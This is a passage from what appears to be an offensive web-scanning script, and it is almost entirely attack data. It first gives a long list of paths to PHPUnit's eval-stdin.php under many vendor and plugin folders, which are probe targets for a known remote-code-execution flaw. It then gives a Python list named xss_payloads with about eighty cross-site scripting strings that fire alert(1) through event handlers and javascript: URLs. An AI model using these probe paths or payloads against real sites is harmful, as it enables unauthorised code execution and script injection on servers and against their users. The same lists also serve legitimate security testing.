    /newsop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /notweb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /nour/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /npteOld/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /numwattana.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /nvagencies/gst/gst_system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /nvagencies/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /oauth/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /objectif-750/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /octuput/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /odata/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /officelara/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /OLD site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /old/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /old/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /old/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /olesistemas/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /onefolder/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /opensupports/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /orion/greensignal/sistemas/demandador/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /p/laravelcrud/svn/2/tree//app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /p/laravelcrud/svn/2/tree/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /p4/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /panel/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /passtastic/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /patronus.sfiec.org.br/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /payment/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /payment/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /payments/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pcc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pesquisa/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pgd/pgnim/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pgd/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pgnim/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /php-u2flib-server-1.0.1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /phpexcel/spreadsheet/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /phpexcel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /phpmailer/PHPMailer/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /phpmailer/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /phpunit/phpunit/Util/PHP/eval-stdin.php
    /phpunit/src/Util/PHP/eval-stdin.php
    /phpunit/Util/PHP/eval-stdin.php
    /pid/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pkm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /plataformaead-dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /platform/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /portal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /portal/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /portalmejora/backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /portalmejora/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /portfolio/karyabersama_old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /portfolio/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pos/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pos/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pos/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /ppid/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pro/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /production/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /production/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /professionaltuning/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /proment/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /proyecto_alerta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /psnlink/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /public/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /publichtml/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /pvra/web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /quotation/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /raphaelfonseca/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /registration/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /release/composer/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /releases/20170811125232/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /releases/ef1eac65f8c91c27435f01d32076f7c450a2a0ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /releases/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /relvadossinteticos.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /reports/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /reports/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /revisao/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /revisao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /RoomBookingR1D/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /royalerumble/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /rrhh/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /runapi/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /runtime/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /saas/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sacv/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /safmanagement.it/publichtml/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sai/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /saml/extlib/simplesamlphp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sandbox/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sbp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /scholarship/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /school/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /scratchwin-backend/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /scratchwin-backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /secure.dibzat/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /see/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /Selfit/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /Selfit/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /semcoal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /server/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /server/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /shop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /shopify/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sic-laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /simasanjesh.ir/public_html/runtime/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /simpeg-code-dinkes/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /simplesamlphp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sirim/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /Sistema-Clinico--com-Laravel-master/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sistema/dompdf-master/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sistema/sistema/dompdf-master/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sistema/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /siswas/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /site/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /sitemaps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sites/default/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sites/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sitio/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /skck_sidoarjo_code/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /skinning-api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /snippets/html2pdf-master/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /socios/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sonvuhong/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /soporte_18/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /soporte/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /spartacus/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /spd/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /splurbAPI/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /spotbills/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /spreadsheet/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /stockapi/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /store/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /store/laravel/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /store/laravel/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /store/laravel/vendor/phpunit/Util/PHP/eval-stdin.php
    /store/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /store/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /straighttalk/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /streamhub/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /streetview/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /stripe-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /stripe/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /studybreak/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /sub_hannah_back/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /subdomains/spartacus/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /subdomains/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /summatest/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /supermind/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /support/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /support/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /support/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /system/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /task_api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /taspenku/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /tbg/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /teacher/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /teacher/yiicarwx/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /test_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /test/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /test/laravel/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /test/laravel/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /test/laravel/vendor/phpunit/Util/PHP/eval-stdin.php
    /test/med-decision/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /test/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /test/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /test/vendor/phpunit/Util/PHP/eval-stdin.php
    /test/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /test/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /test/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /test1/project/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /teste/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /testing/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /testing/laravel/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /testing/laravel/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /testing/laravel/vendor/phpunit/Util/PHP/eval-stdin.php
    /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /testing/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /testing/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /testing/vendor/phpunit/Util/PHP/eval-stdin.php
    /tests/avastar/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ticket/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ticket/laravel/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /ticket/laravel/vendor/phpunit/Util/PHP/eval-stdin.php
    /ticket/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ticket/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /tickets/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /topbrand/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /tps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /transejecutivos/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /trash-DELETE-IT/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /tuto_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /tvm/fd45jn0f5Gd/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /u/gevorg.hakobyan/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /unail-server/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /uniteddatabasedevelopment/unitedisposal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /uniteddatabasedevelopment/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /unitedisposal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /uploads/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /uRTime-Support/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /uwp/fakultas/fh/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /v1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /v1/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /v2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /v2/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /vendor/nesbot/carbon/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
    /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /vendor/phpunit/src/Util/PHP/eval-stdin.php
    /vendor/phpunit/Util/PHP/eval-stdin.php
    /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /vensdor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /verify/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /vestibular/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /vestibular/vestibulares/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /vestibulares/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /vrscop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /web-files/phpexcel/spreadsheet/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /web.public/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /web.public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /web/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
    /webservice_lebong_201901/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /webservice/firebase/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /webvarejo-api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wechatplat/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wf/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /woodfieldestates/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wordpress/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wordpress/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wordpress/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/affinipay-payment-gateway/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/aspose-pdf-importer/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/badgeup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/contact-form-7-to-database-extension/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/jannes-mannes-social-media-auto-publisher/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/js_composer_theme/vendor/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/message-business/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/mir-ad-network/base58php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/mm-plugin/inc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/prh-api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/product-lister-walmart/marketplaces/walmart/lib/walmart-signature/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/realia/libraries/PayPal-PHP-SDK/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/rollbar/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/shortcode-tumblr-gallery/includes/lib/Guzzle/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/turtle-ad-network/base58php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/user-export-with-their-meta-data/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/waves-ad-network/base58php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/wp-heyloyalty/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/plugins/wptimetoread/vendor/kdaviesnz/timetoread/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/themes/Divi-child/inc/meta/tests/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/themes/howto_wp/metabox/tests/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/themes/techmatters/mpdf/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp-content/uploads/2018/01/abc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wp/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ws/geral/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wsviamatica/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wsviamatica/wszool/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /wszool/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /xipada/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /yiicarwx/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /yiiold/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php""".split('\n')

    xss_payloads=[
    '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
    '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
    '<video src=1 href=1 onerror="javascript:alert(1)"></video>',
    '<body src=1 href=1 onerror="javascript:alert(1)"></body>',
    '<image src=1 href=1 onerror="javascript:alert(1)"></image>',
    '<object src=1 href=1 onerror="javascript:alert(1)"></object>',
    '<script src=1 href=1 onerror="javascript:alert(1)"></script>',
    '<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>',
    '<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>',
    '<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>',
    '<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>',
    '<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
    '<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>',
    '<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>',
    '<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>',
    '<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>',
    '<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>',
    '<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>',
    '<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>',
    '<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>',
    '<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>',
    '<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>',
    '<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>',
    '<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>',
    '<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>',
    '<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>',
    '<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>',
    '<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>',
    '<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>',
    '<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>',
    '<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>',
    '<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>',
    '<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>',
    '<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>',
    '<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>',
    '<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>',
    '<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>',
    '<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>',
    '<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>',
    '<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>',
    '<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>',
    '<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>',
    '<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>',
    '<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>',
    '<object onError object onError="javascript:javascript:alert(1)"></object onError>',
    '<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>',
    '<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>',
    '<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>',
    '<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>',
    '<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>',
    '<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>',
    '<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>',
    '<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>',
    '<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>',
    '<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>',
    '<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>',
    '<input onfocus=javascript:alert(1) autofocus>',
    '<input onblur=javascript:alert(1) autofocus><input autofocus>',
    '<video poster=javascript:javascript:alert(1)//',
    '<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
    '<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X',
    '<video><source onerror="javascript:javascript:alert(1)">',
    '<video onerror="javascript:javascript:alert(1)"><source>',
    '<form><button formaction="javascript:javascript:alert(1)">X',
    '<body oninput=javascript:alert(1)><input autofocus>',
    '<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>',
    '<frameset onload=javascript:alert(1)>',
    '<table background="javascript:javascript:alert(1)">',
    '<!--<img src="--><img src=x onerror=javascript:alert(1)//">',
    '<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">',
    '<![><img src="]><img src=x onerror=javascript:alert(1)//">',
    '<style><img src="</style><img src=x onerror=javascript:alert(1)//">',
    '<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>',
    '<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>',
    '<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>',
    '<script>javascript:alert(1)</script>',
    '<IMG SRC="javascript:javascript:alert(1);">',
